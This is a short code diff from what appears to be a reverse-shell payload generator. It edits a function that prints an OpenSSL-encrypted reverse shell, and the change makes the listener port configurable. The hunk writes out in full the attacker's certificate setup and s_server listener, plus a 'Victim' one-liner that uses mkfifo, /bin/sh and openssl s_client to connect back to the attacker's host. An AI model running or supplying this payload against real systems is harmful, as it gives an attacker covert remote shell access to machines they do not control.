@@ -282,7 +282,7 @@ def openSSL(lhost, lport):
     
     {Fore.YELLOW}Listener{Style.RESET_ALL}:
     openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-    openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+    openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}
     
     {Fore.YELLOW}Victim{Style.RESET_ALL}:
     mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s
